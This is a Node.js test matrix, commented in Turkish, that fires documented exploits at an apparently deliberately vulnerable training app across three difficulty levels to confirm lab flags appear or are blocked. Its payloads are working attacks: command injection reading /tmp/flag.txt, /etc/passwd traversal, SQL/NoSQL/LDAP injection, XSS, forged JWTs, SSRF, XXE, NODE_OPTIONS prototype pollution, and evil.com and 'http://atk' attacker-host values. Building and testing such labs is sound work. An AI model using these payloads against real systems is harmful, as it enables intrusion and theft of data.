// ============================================================================
//  test/level-matrix.mjs — TÜM zafiyetler × low/medium/high otomatik exploit matrisi.
//  Çalışan bir hedefe (panel veya tek konteyner) karşı her zafiyetin dokümante
//  edilmiş exploit'ini her seviyede dener ve INTENDED sonucu doğrular:
//    - low/medium: exploit/bypass çalışır → kanonik flag elde edilir
//    - high      : "güvenli" zafiyetlerde flag YOK; "ileri-bypass" olanlarda flag
//  Kullanım:  BASE=http://localhost:3000 node test/level-matrix.mjs
//  (Linux/Docker hedefi gerekir: /tmp, /etc/passwd, ping -c, child_process.)
// ============================================================================
import crypto from "node:crypto";
import http from "node:http";
import { FLAGS } from "../lib/flags.js";

const BASE = process.env.BASE || "http://localhost:3000";
const results = [];
function rec(slug, level, pass, detail = "") {
  results.push({ slug, level, pass });
  const tag = pass ? "\x1b[32mPASS\x1b[0m" : "\x1b[31mFAIL\x1b[0m";
  console.log(`${tag}  ${slug.padEnd(26)} ${String(level).padEnd(7)} ${detail}`);
}
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

async function F(path, { method = "GET", level, headers = {}, body, form, raw, multipart } = {}) {
  const h = { ...headers };
  if (level) h["x-security-level"] = level;
  let b;
  if (multipart) b = multipart;
  else if (form) { h["content-type"] = "application/x-www-form-urlencoded"; b = new URLSearchParams(form).toString(); }
  else if (raw !== undefined) { h["content-type"] = h["content-type"] || "application/json"; b = raw; }
  else if (body !== undefined) { h["content-type"] = h["content-type"] || "application/json"; b = JSON.stringify(body); }
  const r = await fetch(BASE + path, { method, headers: h, body: b, redirect: "manual" });
  return { status: r.status, text: await r.text(), headers: r.headers };
}
// Raw POST allowing custom Host header (host-header poisoning).
function rawPost(path, { host, level, json }) {
  return new Promise((resolve, reject) => {
    const data = JSON.stringify(json);
    const u = new URL(BASE + path);
    const req = http.request({
      hostname: u.hostname, port: u.port || 80, path: u.pathname, method: "POST",
      headers: { "content-type": "application/json", "content-length": Buffer.byteLength(data), "x-security-level": level, ...(host ? { host } : {}) },
    }, (res) => { let t = ""; res.on("data", (c) => (t += c)); res.on("end", () => resolve({ status: res.statusCode, text: t })); });
    req.on("error", reject); req.write(data); req.end();
  });
}
const hasFlag = (text, slug) => text.includes(FLAGS[slug]);
const b64u = (o) => Buffer.from(typeof o === "string" ? o : JSON.stringify(o)).toString("base64url");
const noneToken = (p) => `${b64u({ alg: "none", typ: "JWT" })}.${b64u(p)}.`;
const hs256 = (p, secret) => { const h = b64u({ alg: "HS256", typ: "JWT" }); const pl = b64u(p); return `${h}.${pl}.${crypto.createHmac("sha256", secret).update(`${h}.${pl}`).digest("base64url")}`; };

async function run(slug, level, fn, expect /* "flag" | "noflag" */) {
  try {
    const got = await fn();
    const pass = expect === "flag" ? got === true : got === false;
    rec(slug, level, pass, expect === "flag" ? (got ? "flag alındı" : "flag ALINAMADI") : (got ? "flag SIZDI" : "engellendi/temiz"));
  } catch (e) { rec(slug, level, false, "HATA: " + (e.message || e)); }
}

async function main() {
  console.log(`\n== ördek level matrix → ${BASE} ==\n`);

  // 1. command-injection /cmd (form ip)
  await run("command-injection", "low", async () => hasFlag((await F("/cmd", { method: "POST", level: "low", form: { ip: "127.0.0.1; cat /tmp/flag.txt" } })).text, "command-injection"), "flag");
  await run("command-injection", "medium", async () => hasFlag((await F("/cmd", { method: "POST", level: "medium", form: { ip: "127.0.0.1 | cat /tmp/flag.txt" } })).text, "command-injection"), "flag");
  await run("command-injection", "high", async () => hasFlag((await F("/cmd", { method: "POST", level: "high", form: { ip: "127.0.0.1;cat${IFS}/tmp/flag.txt" } })).text, "command-injection"), "flag");

  // 2. file-inclusion /lfi?file=
  await run("file-inclusion", "low", async () => hasFlag((await F("/lfi?file=" + encodeURIComponent("../../../../etc/passwd"), { level: "low" })).text, "file-inclusion"), "flag");
  await run("file-inclusion", "medium", async () => hasFlag((await F("/lfi?file=" + encodeURIComponent("....//....//....//....//etc/passwd"), { level: "medium" })).text, "file-inclusion"), "flag");
  await run("file-inclusion", "high", async () => hasFlag((await F("/lfi?file=" + encodeURIComponent("/etc/passwd"), { level: "high" })).text, "file-inclusion"), "flag"); // absolute-path bypass (kasıtlı)

  // 3. sql-injection /sqli?id=
  await run("sql-injection", "low", async () => hasFlag((await F("/sqli?id=" + encodeURIComponent("0 UNION SELECT id,username,password,role,email FROM users-- "), { level: "low" })).text, "sql-injection"), "flag");
  await run("sql-injection", "medium", async () => hasFlag((await F("/sqli?id=" + encodeURIComponent("0 UnIoN SeLeCt id,username,password,role,email FROM users-- "), { level: "medium" })).text, "sql-injection"), "flag");
  await run("sql-injection", "high", async () => hasFlag((await F("/sqli?id=" + encodeURIComponent("0 UNION SELECT id,username,password,role,email FROM users-- "), { level: "high" })).text, "sql-injection"), "noflag");

  // 4. sql-injection-blind /sqli-blind (form)
  await run("sql-injection-blind", "low", async () => hasFlag((await F("/sqli-blind", { method: "POST", level: "low", form: { username: "admin", password: "' OR '1'='1" } })).text, "sql-injection-blind"), "flag");
  await run("sql-injection-blind", "medium", async () => hasFlag((await F("/sqli-blind", { method: "POST", level: "medium", form: { username: "admin", password: "' oR '1'='1" } })).text, "sql-injection-blind"), "flag");
  await run("sql-injection-blind", "high", async () => hasFlag((await F("/sqli-blind", { method: "POST", level: "high", form: { username: "admin", password: "' OR '1'='1" } })).text, "sql-injection-blind"), "noflag");

  // 5. xss-reflected /xss-ref?q=  (reflection oracle + reveal endpoint)
  await run("xss-reflected", "low", async () => (await F("/xss-ref?q=" + encodeURIComponent("<img src=x onerror=showFlag()>"), { level: "low" })).text.includes("<img src=x onerror=showFlag()>"), "flag");
  await run("xss-reflected", "medium", async () => (await F("/xss-ref?q=" + encodeURIComponent("<svg onload=showFlag()>"), { level: "medium" })).text.includes("<svg onload=showFlag()>"), "flag");
  await run("xss-reflected", "high", async () => { const t = (await F("/xss-ref?q=" + encodeURIComponent("<script>showFlag()</script>"), { level: "high" })).text; return t.includes("<script>showFlag()</script>"); }, "noflag");

  // 6. xss-stored /xss-stored (POST then GET)
  for (const [lvl, payload, exp] of [["low", "<img src=x onerror=showFlag()>", "flag"], ["medium", "<img src=x onerror=showFlag()>", "flag"], ["high", "<script>showFlag()</script>", "noflag"]]) {
    await run("xss-stored", lvl, async () => {
      await F("/xss-stored", { method: "POST", level: lvl, form: { name: "t", comment: payload } });
      const t = (await F("/xss-stored", { level: lvl })).text;
      return t.includes(payload);
    }, exp);
  }

  // 7. insecure-jwt /jwt (form token)
  await run("insecure-jwt", "low", async () => hasFlag((await F("/jwt", { method: "POST", level: "low", form: { token: noneToken({ username: "x", role: "admin" }) } })).text, "insecure-jwt"), "flag");
  await run("insecure-jwt", "medium", async () => hasFlag((await F("/jwt", { method: "POST", level: "medium", form: { token: hs256({ username: "x", role: "admin" }, "secret123") } })).text, "insecure-jwt"), "flag");
  await run("insecure-jwt", "high", async () => hasFlag((await F("/jwt", { method: "POST", level: "high", form: { token: hs256({ username: "x", role: "admin" }, "secret123") } })).text, "insecure-jwt"), "noflag");

  // 8. cors-misconfig /cors?action=api (X-Fake-Origin)
  await run("cors-misconfig", "low", async () => hasFlag((await F("/cors?action=api", { level: "low", headers: { "x-fake-origin": "https://evil.com" } })).text, "cors-misconfig"), "flag");
  await run("cors-misconfig", "medium", async () => hasFlag((await F("/cors?action=api", { level: "medium", headers: { "x-fake-origin": "https://evilordek-store.com" } })).text, "cors-misconfig"), "flag");
  await run("cors-misconfig", "high", async () => hasFlag((await F("/cors?action=api", { level: "high", headers: { "x-fake-origin": "https://evil.com" } })).text, "cors-misconfig"), "noflag");

  // 9. mass-assignment /mass (reset → POST)
  for (const [lvl, payload, exp] of [["low", { role: "admin" }, "flag"], ["medium", { isAdmin: true }, "flag"], ["high", { role: "admin", isAdmin: true }, "noflag"]]) {
    await run("mass-assignment", lvl, async () => {
      await F("/mass?reset=1", { method: "POST", level: lvl, body: {} });
      return hasFlag((await F("/mass", { method: "POST", level: lvl, body: { email: "a@b.c", ...payload } })).text, "mass-assignment");
    }, exp);
  }

  // 10. idor-bola /idor?orderId=
  await run("idor-bola", "low", async () => hasFlag((await F("/idor?orderId=1001", { level: "low" })).text, "idor-bola"), "flag");
  await run("idor-bola", "medium", async () => hasFlag((await F("/idor?orderId=order-a1b2c3d4-super-secret-admin", { level: "medium" })).text, "idor-bola"), "flag");
  await run("idor-bola", "high", async () => hasFlag((await F("/idor?orderId=1001", { level: "high" })).text, "idor-bola"), "noflag");

  // 11. mfa-bypass /mfa-router (logout → login → dashboard)
  for (const [lvl, exp] of [["low", "flag"], ["medium", "flag"], ["high", "noflag"]]) {
    await run("mfa-bypass", lvl, async () => {
      await F("/mfa-router?action=logout", { level: lvl });
      await F("/mfa-router?action=login", { method: "POST", level: lvl, body: { email: "admin@ordek.com", password: "password" } });
      return hasFlag((await F("/mfa-router?page=dashboard", { level: lvl })).text, "mfa-bypass");
    }, exp);
  }

  // 12. insecure-randomness /insecure-router (predict token)
  await run("insecure-randomness", "low", async () => {
    await F("/insecure-router?action=clear_outbox", { method: "POST", level: "low" });
    await F("/insecure-router?action=reset", { method: "POST", level: "low", body: { email: "hacker@ordek.com" } });
    const ob = (await F("/insecure-router?page=outbox", { level: "low" })).text;
    const m = ob.match(/Kodun:\s*<b[^>]*>([^<]+)<\/b>/);
    if (!m) return false;
    await F("/insecure-router?action=reset", { method: "POST", level: "low", body: { email: "admin@ordek.com" } });
    const guess = String(Number(m[1].trim()) + 1);
    const v = await F("/insecure-router?action=verify", { method: "POST", level: "low", body: { email: "admin@ordek.com", token: guess, new_password: "pwned" } });
    return /"admin_hacked"\s*:\s*true/.test(v.text);
  }, "flag");
  await run("insecure-randomness", "medium", async () => {
    await F("/insecure-router?action=reset", { method: "POST", level: "medium", body: { email: "admin@ordek.com" } });
    // ±4 sn pencere: reset→verify gidiş-dönüşü saniye sınırını aşsa bile tahmin tutar (flaky'i önler).
    for (const d of [0, -1, 1, -2, 2, -3, 3, -4, 4]) {
      const now = Math.floor(Date.now() / 1000) + d;
      const guess = ((now * 3 + 142) % 100000).toString().padStart(5, "0");
      const v = await F("/insecure-router?action=verify", { method: "POST", level: "medium", body: { email: "admin@ordek.com", token: guess, new_password: "pwned" } });
      if (/"admin_hacked"\s*:\s*true/.test(v.text)) return true;
    }
    return false;
  }, "flag");
  await run("insecure-randomness", "high", async () => {
    await F("/insecure-router?action=reset", { method: "POST", level: "high", body: { email: "admin@ordek.com" } });
    const v = await F("/insecure-router?action=verify", { method: "POST", level: "high", body: { email: "admin@ordek.com", token: "00000000", new_password: "pwned" } });
    return /"admin_hacked"\s*:\s*true/.test(v.text);
  }, "noflag");

  // 13. ssrf /ssrf-router (POST url)
  await run("ssrf", "low", async () => hasFlag((await F("/ssrf-router", { method: "POST", level: "low", body: { url: "http://localhost:8080/admin" } })).text, "ssrf"), "flag");
  await run("ssrf", "medium", async () => hasFlag((await F("/ssrf-router", { method: "POST", level: "medium", body: { url: "http://2130706433:8080/admin" } })).text, "ssrf"), "flag");
  await run("ssrf", "high", async () => hasFlag((await F("/ssrf-router", { method: "POST", level: "high", body: { url: "http://api.ordek-store.com@127.0.0.1:8080/admin" } })).text, "ssrf"), "flag"); // startsWith bypass (kasıtlı)

  // 14. prototype-pollution /prototype-router
  await run("prototype-pollution", "low", async () => hasFlag((await F("/prototype-router", { method: "POST", level: "low", raw: '{"__proto__":{"isAdmin":true}}' })).text, "prototype-pollution"), "flag");
  await run("prototype-pollution", "medium", async () => hasFlag((await F("/prototype-router", { method: "POST", level: "medium", raw: '{"constructor":{"prototype":{"isAdmin":true}}}' })).text, "prototype-pollution"), "flag");
  await run("prototype-pollution", "high", async () => hasFlag((await F("/prototype-router", { method: "POST", level: "high", raw: '{"__proto__":{"isAdmin":true}}' })).text, "prototype-pollution"), "noflag");

  // 15. server-side-pp-gadget /pp-gadget (pollute → trigger)
  for (const [lvl, payload, exp] of [
    ["low", '{"__proto__":{"env":{"NODE_OPTIONS":"--require /tmp/evil.js"}}}', "flag"],
    ["medium", '{"constructor":{"prototype":{"env":{"NODE_OPTIONS":"--require /tmp/evil.js"}}}}', "flag"],
    ["high", '{"__proto__":{"env":{"NODE_OPTIONS":"--require /tmp/evil.js"}}}', "noflag"],
  ]) {
    await run("server-side-pp-gadget", lvl, async () => {
      await F("/pp-gadget", { method: "POST", level: lvl, raw: payload });
      return hasFlag((await F("/pp-gadget?action=trigger", { level: lvl })).text, "server-side-pp-gadget");
    }, exp);
  }

  // 16. ssti /ssti?render=1
  for (const [lvl, exp] of [["low", "flag"], ["medium", "flag"], ["high", "noflag"]]) {
    await run("ssti", lvl, async () => hasFlag((await F("/ssti?render=1", { method: "POST", level: lvl, body: { bio: "<%= flag %>" } })).text, "ssti"), exp);
  }

  // 17. insecure-deserialization /insecure-deserialization
  const deser = (obj) => Buffer.from(JSON.stringify(obj)).toString("base64");
  await run("insecure-deserialization", "low", async () => hasFlag((await F("/insecure-deserialization", { method: "POST", level: "low", body: { token: deser({ cmd_output: "_$$ND_FUNC$$_function(){return 'pwned'}()" }) } })).text, "insecure-deserialization"), "flag");
  await run("insecure-deserialization", "medium", async () => hasFlag((await F("/insecure-deserialization", { method: "POST", level: "medium", body: { token: deser({ cmd_output: "pwned" }) } })).text, "insecure-deserialization"), "flag");
  await run("insecure-deserialization", "high", async () => hasFlag((await F("/insecure-deserialization", { method: "POST", level: "high", body: { token: deser({ cmd_output: "pwned" }) } })).text, "insecure-deserialization"), "noflag");

  // 18. open-redirect /open-redirect?redirect=
  await run("open-redirect", "low", async () => hasFlag((await F("/open-redirect?redirect=" + encodeURIComponent("http://evil.com"), { level: "low" })).text, "open-redirect"), "flag");
  await run("open-redirect", "medium", async () => hasFlag((await F("/open-redirect?redirect=" + encodeURIComponent("//evil.com/ordek-store.com"), { level: "medium" })).text, "open-redirect"), "flag");
  await run("open-redirect", "high", async () => hasFlag((await F("/open-redirect?redirect=" + encodeURIComponent("http://evil.com"), { level: "high" })).text, "open-redirect"), "noflag");

  // 19. host-header-poisoning /host-header (raw Host)
  await run("host-header-poisoning", "low", async () => hasFlag((await rawPost("/host-header", { host: "evil.com", level: "low", json: { email: "a@b.c" } })).text, "host-header-poisoning"), "flag");
  await run("host-header-poisoning", "medium", async () => hasFlag((await rawPost("/host-header", { host: "localhost:@evil.com", level: "medium", json: { email: "a@b.c" } })).text, "host-header-poisoning"), "flag");
  await run("host-header-poisoning", "high", async () => hasFlag((await rawPost("/host-header", { host: "evil.com", level: "high", json: { email: "a@b.c" } })).text, "host-header-poisoning"), "noflag");

  // 20. race-condition /race-condition (concurrency)
  for (const [lvl, n, exp] of [["low", 25, "flag"], ["medium", 40, "flag"], ["high", 25, "noflag"]]) {
    await run("race-condition", lvl, async () => {
      await F("/race-condition?reset=1", { level: lvl });
      const reqs = Array.from({ length: n }, () => F("/race-condition", { method: "POST", level: lvl, body: { coupon: "WELCOME100" } }).catch(() => ({ text: "" })));
      const rs = await Promise.all(reqs);
      return rs.some((r) => hasFlag(r.text, "race-condition"));
    }, exp);
  }

  // 21. business-logic /business-logic
  await run("business-logic", "low", async () => hasFlag((await F("/business-logic", { method: "POST", level: "low", body: { cart: [{ id: "ordek_oyuncak", quantity: 1 }], totalPrice: 1 } })).text, "business-logic"), "flag");
  await run("business-logic", "medium", async () => hasFlag((await F("/business-logic", { method: "POST", level: "medium", body: { cart: [{ id: "ordek_oyuncak", quantity: 1 }, { id: "ordek_kupa", quantity: -2 }], totalPrice: 0 } })).text, "business-logic"), "flag");
  await run("business-logic", "high", async () => hasFlag((await F("/business-logic", { method: "POST", level: "high", body: { cart: [{ id: "ordek_oyuncak", quantity: 1 }, { id: "ordek_kupa", quantity: -2 }], totalPrice: 0 } })).text, "business-logic"), "noflag");

  // 22. redos /redos (POST username)
  const longBad = "a".repeat(45) + "!";
  await run("redos", "low", async () => hasFlag((await F("/redos", { method: "POST", level: "low", body: { username: longBad } })).text, "redos"), "flag");
  await run("redos", "medium", async () => hasFlag((await F("/redos", { method: "POST", level: "medium", body: { username: longBad } })).text, "redos"), "flag");
  await run("redos", "high", async () => hasFlag((await F("/redos", { method: "POST", level: "high", body: { username: longBad } })).text, "redos"), "noflag");

  // 23. clickjacking /clickjacking?action=panel (frame header oracle)
  await run("clickjacking", "low", async () => { const h = (await F("/clickjacking?action=panel", { level: "low" })).headers; return !h.get("x-frame-options") && !(h.get("content-security-policy") || "").includes("frame-ancestors"); }, "flag");
  await run("clickjacking", "medium", async () => { const h = (await F("/clickjacking?action=panel", { level: "medium" })).headers; return (h.get("x-frame-options") || "").includes("ALLOW-FROM"); }, "flag");
  await run("clickjacking", "high", async () => { const h = (await F("/clickjacking?action=panel", { level: "high" })).headers; return (h.get("x-frame-options") || "").includes("DENY") && (h.get("content-security-policy") || "").includes("frame-ancestors"); }, "flag"); // high = korumalı (beklenen)

  // 24. file-upload /upload (multipart, reset between)
  for (const [lvl, declared, exp] of [["low", "application/octet-stream", "flag"], ["medium", "image/png", "flag"], ["high", "image/png", "noflag"]]) {
    await run("file-upload", lvl, async () => {
      await F("/upload?reset=1", { method: "POST", level: lvl, body: {} });
      const fd = new FormData();
      fd.append("file", new Blob(["console.log('shell')"], { type: "text/javascript" }), "shell.js");
      fd.append("declaredType", declared);
      return hasFlag((await F("/upload", { method: "POST", level: lvl, multipart: fd })).text, "file-upload");
    }, exp);
  }

  // 25. csv-injection /csv-injection (reset → POST name)
  for (const [lvl, name, exp] of [["low", '=HYPERLINK("http://atk")', "flag"], ["medium", "@SUM(1+1)", "flag"], ["high", '=HYPERLINK("http://atk")', "noflag"]]) {
    await run("csv-injection", lvl, async () => {
      await F("/csv-injection?reset=1", { method: "POST", level: lvl, body: {} });
      return hasFlag((await F("/csv-injection", { method: "POST", level: lvl, form: { name } })).text, "csv-injection");
    }, exp);
  }

  // 26. brute-force /brute (correct creds)
  for (const lvl of ["low", "medium", "high"]) {
    await run("brute-force", lvl, async () => hasFlag((await F("/brute", { method: "POST", level: lvl, form: { username: "admin", password: "bird" }, headers: { "x-forwarded-for": "9.9." + Math.floor(Math.random() * 250) + "." + Math.floor(Math.random() * 250) } })).text, "brute-force"), "flag");
  }

  // 27. csrf /csrf (Origin header)
  await run("csrf", "low", async () => hasFlag((await F("/csrf", { method: "POST", level: "low", form: { email: "x@evil.com" } })).text, "csrf"), "flag");
  await run("csrf", "medium", async () => hasFlag((await F("/csrf", { method: "POST", level: "medium", form: { email: "x@evil.com" }, headers: { origin: "http://localhost:3000.evil.com" } })).text, "csrf"), "flag");
  await run("csrf", "high", async () => hasFlag((await F("/csrf", { method: "POST", level: "high", form: { email: "x@evil.com" } })).text, "csrf"), "flag"); // token gönderilmez → loose-check bypass

  // 28. nmap-recon /nmap-recon (GET; -p- ile gizli 31337 servisi)
  await run("nmap-recon", "low", async () => hasFlag((await F("/nmap-recon", { level: "low" })).text, "nmap-recon"), "flag");
  await run("nmap-recon", "medium", async () => hasFlag((await F("/nmap-recon", { level: "medium" })).text, "nmap-recon"), "noflag"); // varsayılan tarama gizli portu göstermez
  await run("nmap-recon", "medium", async () => hasFlag((await F("/nmap-recon?ports=all", { level: "medium" })).text, "nmap-recon"), "flag");   // -p- ile bulunur
  await run("nmap-recon", "high", async () => hasFlag((await F("/nmap-recon?ports=all", { level: "high" })).text, "nmap-recon"), "noflag"); // firewall ile filtered

  // 29. metasploit-rce /metasploit-rce (POST cmd/token; exploit modülü mantığı)
  await run("metasploit-rce", "low", async () => hasFlag((await F("/metasploit-rce", { method: "POST", level: "low", body: { cmd: "id" } })).text, "metasploit-rce"), "flag");
  await run("metasploit-rce", "medium", async () => hasFlag((await F("/metasploit-rce", { method: "POST", level: "medium", body: { cmd: "id" } })).text, "metasploit-rce"), "noflag"); // token yok → reddedilir
  await run("metasploit-rce", "medium", async () => hasFlag((await F("/metasploit-rce", { method: "POST", level: "medium", body: { cmd: "id", token: "VULNSOFT-DEFAULT" } })).text, "metasploit-rce"), "flag"); // sızan token
  await run("metasploit-rce", "high", async () => hasFlag((await F("/metasploit-rce", { method: "POST", level: "high", body: { cmd: "id", token: "VULNSOFT-DEFAULT" } })).text, "metasploit-rce"), "noflag"); // yamalı

  // ════════════════════════ FAZ 2 — 10 YENİ ZAFİYET ════════════════════════
  // 30. xxe /xxe (raw XML; harici varlık ile dosya okuma)
  const xxe = (dt) => `<?xml version="1.0"?>${dt}<invoice><note>&x;</note></invoice>`;
  const xxeDT = (kw) => `<${kw} r [<!ENTITY x SYSTEM "file:///tmp/xxe_flag.txt">]>`;
  const xmlH = { "content-type": "application/xml" };
  await run("xxe", "low", async () => hasFlag((await F("/xxe", { method: "POST", level: "low", headers: xmlH, raw: xxe(xxeDT("!DOCTYPE")) })).text, "xxe"), "flag");
  await run("xxe", "medium", async () => hasFlag((await F("/xxe", { method: "POST", level: "medium", headers: xmlH, raw: xxe(xxeDT("!doctype")) })).text, "xxe"), "flag"); // küçük harf doctype WAF'ı atlar
  await run("xxe", "high", async () => hasFlag((await F("/xxe", { method: "POST", level: "high", headers: xmlH, raw: xxe(xxeDT("!DOCTYPE")) })).text, "xxe"), "noflag");

  // 31. nosql-injection /nosql ($ne / $regex operatör enjeksiyonu)
  await run("nosql-injection", "low", async () => hasFlag((await F("/nosql", { method: "POST", level: "low", body: { username: "admin", password: { $ne: "" } } })).text, "nosql-injection"), "flag");
  await run("nosql-injection", "medium", async () => hasFlag((await F("/nosql", { method: "POST", level: "medium", body: { username: "admin", password: { $regex: "^.*" } } })).text, "nosql-injection"), "flag");
  await run("nosql-injection", "high", async () => hasFlag((await F("/nosql", { method: "POST", level: "high", body: { username: "admin", password: { $ne: "" } } })).text, "nosql-injection"), "noflag");

  // 32. graphql-injection /graphql (introspection + yetkisiz alan)
  const gqUser = '{"query":"{ user(id:1){ username secretNote } }"}';
  await run("graphql-injection", "low", async () => hasFlag((await F("/graphql", { method: "POST", level: "low", raw: gqUser })).text, "graphql-injection"), "flag");
  await run("graphql-injection", "medium", async () => hasFlag((await F("/graphql", { method: "POST", level: "medium", raw: gqUser })).text, "graphql-injection"), "flag");
  await run("graphql-injection", "high", async () => hasFlag((await F("/graphql", { method: "POST", level: "high", raw: gqUser })).text, "graphql-injection"), "noflag");

  // 33. ldap-injection /ldap (filtre enjeksiyonu)
  await run("ldap-injection", "low", async () => hasFlag((await F("/ldap", { method: "POST", level: "low", form: { username: "*)(uid=*))(|(uid=*", password: "x" } })).text, "ldap-injection"), "flag");
  await run("ldap-injection", "medium", async () => hasFlag((await F("/ldap", { method: "POST", level: "medium", form: { username: "admin)(&)", password: "x" } })).text, "ldap-injection"), "flag");
  await run("ldap-injection", "high", async () => hasFlag((await F("/ldap", { method: "POST", level: "high", form: { username: "*)(uid=*))(|(uid=*", password: "x" } })).text, "ldap-injection"), "noflag");

  // 34. xpath-injection /xpath (tautoloji)
  await run("xpath-injection", "low", async () => hasFlag((await F("/xpath", { method: "POST", level: "low", form: { username: "admin' or '1'='1", password: "x" } })).text, "xpath-injection"), "flag");
  await run("xpath-injection", "medium", async () => hasFlag((await F("/xpath", { method: "POST", level: "medium", form: { username: 'admin" or "1"="1', password: "x" } })).text, "xpath-injection"), "flag");
  await run("xpath-injection", "high", async () => hasFlag((await F("/xpath", { method: "POST", level: "high", form: { username: "admin' or '1'='1", password: "x" } })).text, "xpath-injection"), "noflag");

  // 35. http-parameter-pollution /hpp (parametre çoğaltma)
  await run("http-parameter-pollution", "low", async () => hasFlag((await F("/hpp?role=user&role=admin", { level: "low" })).text, "http-parameter-pollution"), "flag");
  await run("http-parameter-pollution", "medium", async () => hasFlag((await F("/hpp?role=user&role%5B%5D=admin", { level: "medium" })).text, "http-parameter-pollution"), "flag");
  await run("http-parameter-pollution", "high", async () => hasFlag((await F("/hpp?role=user&role%5B%5D=admin", { level: "high" })).text, "http-parameter-pollution"), "noflag");

  // 36. web-cache-poisoning /cache-poison (unkeyed X-Forwarded-Host → zehirle, temiz iste)
  for (const [lvl, xfh, exp] of [
    ["low", 'x"><img src=x onerror=alert(1)>', "flag"],
    ["medium", 'x" onmouseover="alert(1)', "flag"],
    ["high", 'evil"><script>bad()</script>', "noflag"],
  ]) {
    await run("web-cache-poisoning", lvl, async () => {
      await F("/cache-poison?reset=1", { level: lvl });
      await F("/cache-poison", { level: lvl, headers: { "x-forwarded-host": xfh } }); // saldırgan zehirler
      return hasFlag((await F("/cache-poison", { level: lvl })).text, "web-cache-poisoning"); // kurban (temiz) alır
    }, exp);
  }

  // 37. websocket-tampering /ws-chat (mesaj role/isStaff kurcalama)
  await run("websocket-tampering", "low", async () => hasFlag((await F("/ws-chat", { method: "POST", level: "low", body: { action: "getSecret", role: "admin" } })).text, "websocket-tampering"), "flag");
  await run("websocket-tampering", "medium", async () => hasFlag((await F("/ws-chat", { method: "POST", level: "medium", body: { action: "getSecret", isStaff: true } })).text, "websocket-tampering"), "flag");
  await run("websocket-tampering", "high", async () => hasFlag((await F("/ws-chat", { method: "POST", level: "high", body: { action: "getSecret", role: "admin" } })).text, "websocket-tampering"), "noflag");

  // 38. git-disclosure /git-disclosure (.git / .bak ifşası)
  await run("git-disclosure", "low", async () => hasFlag((await F("/git-disclosure?path=/config.php.bak", { level: "low" })).text, "git-disclosure"), "flag");
  await run("git-disclosure", "medium", async () => hasFlag((await F("/git-disclosure?path=/config.php.bak", { level: "medium" })).text, "git-disclosure"), "flag"); // .git kapalı, .bak açık
  await run("git-disclosure", "high", async () => hasFlag((await F("/git-disclosure?path=/config.php.bak", { level: "high" })).text, "git-disclosure"), "noflag");

  // 39. jwt-alg-confusion /jwt-confusion (RS256→HS256: public key'i HMAC sırrı yap)
  const forgeAdmin = async () => {
    const pub = JSON.parse((await F("/jwt-confusion?action=pubkey")).text).publicKey;
    return hs256({ user: "x", role: "admin" }, pub); // pubkey'i HMAC sırrı olarak imzala
  };
  await run("jwt-alg-confusion", "low", async () => hasFlag((await F("/jwt-confusion", { method: "POST", level: "low", body: { token: await forgeAdmin() } })).text, "jwt-alg-confusion"), "flag");
  await run("jwt-alg-confusion", "medium", async () => hasFlag((await F("/jwt-confusion", { method: "POST", level: "medium", body: { token: await forgeAdmin() } })).text, "jwt-alg-confusion"), "flag");
  await run("jwt-alg-confusion", "high", async () => hasFlag((await F("/jwt-confusion", { method: "POST", level: "high", body: { token: await forgeAdmin() } })).text, "jwt-alg-confusion"), "noflag");

  // ---- flag isolation sanity: panel ana sayfası & bundle flag içermemeli ----
  try {
    const home = (await F("/")).text;
    const leaked = Object.values(FLAGS).filter((f) => home.includes(f));
    rec("flag-isolation", "panel-home", leaked.length === 0, leaked.length === 0 ? "ana sayfada flag yok" : `SIZAN: ${leaked.join(", ")}`);
  } catch (e) { rec("flag-isolation", "panel-home", false, "HATA: " + e.message); }

  // ---- özet ----
  const fails = results.filter((r) => !r.pass);
  console.log(`\n== ÖZET: ${results.length - fails.length}/${results.length} PASS ==`);
  if (fails.length) { console.log("FAIL olanlar:"); fails.forEach((f) => console.log("  - " + f.slug + " / " + f.level)); process.exitCode = 1; }
}

main().catch((e) => { console.error("matrix çöktü:", e); process.exitCode = 1; });
